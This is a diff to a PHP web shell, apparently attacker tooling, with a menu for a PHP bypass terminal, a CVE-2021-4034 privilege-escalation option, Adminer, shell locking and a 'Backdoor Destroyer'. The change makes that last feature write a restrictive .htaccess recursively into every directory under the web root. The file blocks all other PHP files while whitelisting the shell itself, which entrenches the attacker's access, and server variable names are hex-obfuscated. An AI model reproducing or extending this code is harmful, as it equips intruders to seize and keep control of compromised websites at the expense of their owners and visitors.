@@ -1,13 +1,9 @@
 <?php
 session_start();
 date_default_timezone_set("Asia/Jakarta");
-
-// Konfigurasi
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
-
-// Fungsi untuk tampilan halaman login
 function show_login_page($message = "")
 {
 ?>
@@ -294,12 +290,9 @@ if ($_GET['don'] == true) {
         }
 
         body {
-            background-image: url('https://7x1337.com/s.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-
+            background-color: #000;
             font-family: monospace
+            color: #fff;
         }
 
         .btn-modal-close:hover,
@@ -688,7 +681,7 @@ if ($_GET['don'] == true) {
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=bypasser" class="btn-submit"><i class="fa-solid fa-terminal"></i> PHP7x Bypass</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-bug"></i> CVE-2021-4034</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
-            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
+            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i>  Backdoor Destroyer</a></li>
             <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i class="fa-solid fa-flask"></i> Linux Exploit</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
             <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
@@ -1372,8 +1365,22 @@ failed();
 if (isset($_GET['destroy'])) {
     $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
     $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
-    if ($fungsi[4]($DOC_ROOT)) {
-        $htaccess = '
+    
+    function createHtaccessRecursively($dirPath, $htaccessContent) {
+        if (!is_dir($dirPath)) {
+            return false;
+        }
+        file_put_contents($dirPath . '/.htaccess', $htaccessContent);
+
+        $subdirs = glob($dirPath . '/*', GLOB_ONLYDIR);
+        foreach ($subdirs as $subdir) {
+            createHtaccessRecursively($subdir, $htaccessContent);
+        }
+
+        return true;
+    }
+
+    $htaccess = '
 <Files *.ph*>
     Order Deny,Allow
     Deny from all
@@ -1416,9 +1423,7 @@ if (isset($_GET['destroy'])) {
 </Files>
 <FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|configuration.php)$">
     Order allow,deny
-
- Allow from all
-
+    Allow from all
 </FilesMatch>
 
 <IfModule mod_rewrite.c>
@@ -1432,16 +1437,15 @@ RewriteRule . /index.php [L]
 ErrorDocument 403 /index.php
 ErrorDocument 404 /index.php
 ';
-        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
-        if ($put_htt) {
-            success();
-        } else {
-            failed();
-        }
+
+    // Menjalankan fungsi rekursif
+    if (createHtaccessRecursively($DOC_ROOT, $htaccess)) {
+        success();
     } else {
         failed();
     }
 }
+
 
 
 if (isset($_POST['save-editor'])) {
